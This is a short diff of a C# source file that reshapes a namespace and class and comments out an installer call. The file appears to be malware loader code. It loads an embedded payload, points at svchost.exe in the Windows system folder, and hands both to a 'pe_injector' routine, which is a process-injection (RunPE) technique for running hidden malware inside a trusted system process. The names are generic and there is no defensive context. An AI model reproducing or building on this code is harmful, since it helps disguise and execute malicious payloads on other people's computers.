@@ -1,20 +1,18 @@
 ﻿using System;
 using System.IO;
+using A;
 
-namespace A
+public class class1
 {
-    public class class1
+    public static void method1()
     {
-        public static void method1()
-        {
-            byte[] Payload = ResourceGetter.GetPayload();
-            
-            string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
-            string winLogonPath = Path.Combine(sysPath, "svchost.exe");
+        byte[] Payload = ResourceGetter.GetPayload();
 
-            Installer.InstallFile();
+        string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
+        string winLogonPath = Path.Combine(sysPath, "svchost.exe");
 
-            pe_injector.RunExecRoutine(Payload, winLogonPath, string.Empty);
-        }
+        //            Installer.InstallFile();
+
+        pe_injector.RunExecRoutine(Payload, winLogonPath, string.Empty);
     }
 }
